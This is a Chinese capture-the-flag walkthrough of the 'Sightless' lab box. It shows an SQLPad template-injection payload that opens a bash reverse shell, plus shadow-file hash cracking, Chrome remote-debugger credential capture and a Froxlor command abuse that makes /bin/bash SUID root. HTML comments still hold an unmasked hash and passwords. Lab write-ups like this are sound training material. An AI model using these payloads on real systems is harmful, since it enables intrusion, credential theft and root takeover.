# Sightless

> 本机 IP: 11.11.11.11
>
> 目标 IP: 11.11.11.12
>
> 参考 [wp1](https://blog.csdn.net/m0_52742680/article/details/142123113) [wp2](https://loghmariala.github.io/posts/Sightless/)

```sh
$ nmap -sSVC 11.11.11.12
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings:
|   GenericLines:
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:11.11.11.12]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Sightless.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)

$ vi /etc/hosts
[+] 11.11.11.12 sightless.htb
```

访问 sightless.htb, 其中有一个跳转到 sqlpad.sightless.htb

```shell
$ vi /etc/hosts
[+] 11.11.11.12 sqlpad.sightless.htb
```

访问 http://sqlpad.sightless.htb/ 是一个 SQLPad 组件, 搜索存在漏洞 CVE-2022-0944, 6.10.1 之前版本存在注入漏洞, 可远程执行代码

<!-- [wp](https://blog.csdn.net/m0_52742680/article/details/142123113), burp抓包可看具体版本为6.10.0 -->

Linux 监听:`nc -lvvp 23333` -> 连接 -> Driver:MySQL -> Database 输入 payload 反弹 shell:

```sql
-- Database 中输入后保存
{{ process.mainModule.require('child_process').exec('bash -c "bash -i >& /dev/tcp/11.11.11.11/23333 0>&1"') }}
```

反弹成功后显示权限为 root

```sh
# 在 docker 中
/var/lib/sqlpad $ cd /

/ $ ls -al
-rwxr-xr-x   1 root root    0 Aug  2 09:30 .dockerenv
-rwxr-xr-x   1 root root  413 Mar 12  2022 docker-entrypoint

/ $ ls -alh /.dockerenv
-rwxr-xr-x 1 root root 0 Aug  2 09:30 /.dockerenv
```

有文件`.dockerenv`和`docker-entrypoint`, 判断在 docker 中

```sh
$ cat /etc/passwd
node:x:1000:1000::/home/node:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash

$ cat /etc/shadow
node:!:19053:0:99999:7:::
michael:⬛⬛⬛:19860:0:99999:7:::
```

<!-- 复制 michael 的密码 hash 值`$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/`到文件`hash`中进行解密 -->

复制 michael 的密码 hash 值`⬛⬛⬛`到文件`hash`中进行解密

<!-- ```shell
$ john hash -w=/usr/share/wordlists/rockyou.txt
...
insaneclownposse (?)
...
``` -->

```sh
$ john hash -w=/usr/share/wordlists/rockyou.txt
...
⬛⬛⬛ (?)
...
```

<!-- ssh 使用 michael:insaneclownposse 登录成功 -->

ssh 使用 michael:⬛⬛⬛ 登录成功

```sh
michael@sightless:~$ ls
user.txt
```

## Privilege Escalation

```sh
# 无果
# michael@sightless:~$ sudo -l
# michael@sightless:~$ find / -perm -u=s -f type 2>/dev/null
# 还有一个用户 john, UID=1001 但是没权限

michael@sightless:~$ ss -tlnp
...
LISTEN    0    511    127.0.0.1:8080    0.0.0.0:*
LISTEN    0    10     127.0.0.1:18888   0.0.0.0:*
...
```

Send-Q=10 的端口后面会用, 先将 8080 转发至本地

```sh
# local
$ ssh -L 8080:127.0.0.1:8080 michael@sightless.htb -N -f

# -N: 不执行远程命令
# -f: 在后台运行SSH会话
```

访问 http://127.0.0.1:8080/ 到 Froxlor 登录界面, 无果

上传 pspy64 查看进程信息

```sh
$ scp /root/Desktop/pspy64 michael@sightless.htb:/tmp

michael@sightless:/tmp$ chmod +x pspy64
michael@sightless:/tmp$ ./pspy64
2024/09/13 07:31:24 CMD: UID=1001  PID=1822   | /opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=1768 --no-sandbox --disable-dev-shm-usage --enable-automation --remote-debugging-port=0 --test-type=webdriver --allow-pre-commit-input --ozone-platform=headless --disable-gpu-compositing --lang=en-US --num-raster-threads=1 --renderer-client-id=5 --time-ticks-at-unix-epoch=-1726211554077008 --launch-time-ticks=276762732 --sh
2024/09/13 07:31:24 CMD: UID=1001  PID=1793   | /opt/google/chrome/chrome --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --no-sandbox --disable-dev-shm-usage --use-angle=swiftshader-webgl --use-gl=angle --headless --crashpad-handler-pid=1768 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=3,i,1365604885317938204,13150205076573000667,262144 --disable-features=PaintHolding --variations-seed-version --enable-logging --log-level=0 --enable-crash-reporter
2024/09/13 07:31:24 CMD: UID=1001  PID=1790   | /opt/google/chrome/chrome --type=gpu-process --no-sandbox --disable-dev-shm-usage --headless --ozone-platform=headless --use-angle=swiftshader-webgl --headless --crashpad-handler-pid=1768 --gpu-preferences=WAAAAAAAAAAgAAAMAAAAAAAAAAAAAAAAAABgAAEAAAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAAAAAAAYAAAAAAAAAAgAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --use-gl=angle --shared-files --field-trial-handle=3,i,1365604
2024/09/13 07:31:24 CMD: UID=1001  PID=1773   | /opt/google/chrome/chrome --type=zygote --no-sandbox --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=1768 --enable-crash-reporter
2024/09/13 07:31:24 CMD: UID=1001  PID=1772   | /opt/google/chrome/chrome --type=zygote --no-zygote-sandbox --no-sandbox --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=1768 --enable-crash-reporter
2024/09/13 07:31:24 CMD: UID=1001  PID=1768   | /opt/google/chrome/chrome_crashpad_handler --monitor-self-annotation=ptype=crashpad-handler --database=/tmp/Crashpad --url=https://clients2.google.com/cr/report --annotation=channel= --annotation=lsb-release=Ubuntu 22.04.4 LTS --annotation=plat=Linux --annotation=prod=Chrome_Headless --annotation=ver=125.0.6422.60 --initial-client-fd=6 --shared-client-connection
2024/09/13 07:31:24 CMD: UID=1001  PID=1763   | /opt/google/chrome/chrome --allow-pre-commit-input --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-dev-shm-usage --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-logging --headless --log-level=0 --no-first-run --no-sandbox --no-service-autorun --password-store=basic --remote-debugging-port=0 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.org.chromium.Chromium.0ge2G9 data:,
```

进程中开启了谷歌, 参考文章[Chrome Remote Debugger Pentesting](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/), 对其他端口进行转发, 其中有个 Send-Q=10 端口 18888

```sh
LISTEN    0    10     127.0.0.1:18888   0.0.0.0:*

$ ssh -L 18888:127.0.0.1:18888 michael@sightless.htb -N -f
```

谷歌, 访问`chrome://inspect/#devices`

<!-- Devices -> Configure -> localhost:18888 -> Enable port forwarding -> Done -> Remote Target -> Froxlor -> inspect -> 开发者控制台 Network -> index.php -> payload -> admin/ForlorfroxAdmin -->

Devices -> Configure -> localhost:18888 -> Enable port forwarding -> Done -> Remote Target -> Froxlor -> inspect -> 开发者控制台 Network -> index.php -> payload -> admin:⬛⬛⬛

登录进入 Froxlor -> PHP -> PHP-FPM versions -> Create new PHP version -> php-fpm restart command: chmod 4777 /bin/bash -> save -> System -> Settings -> PHP-FPM -> SAVE -> Click here to continue

```sh
# wait a minute
michael@sightless:~$ ls -al /bin/bash
-rwsrwxrwx 1 root root ... /bin/bash
michael@sightless:~$ /bin/bash -p
bash-5.1# whoami
root
bash-5.1# cd /root
bash-5.1# ls
root.txt
```
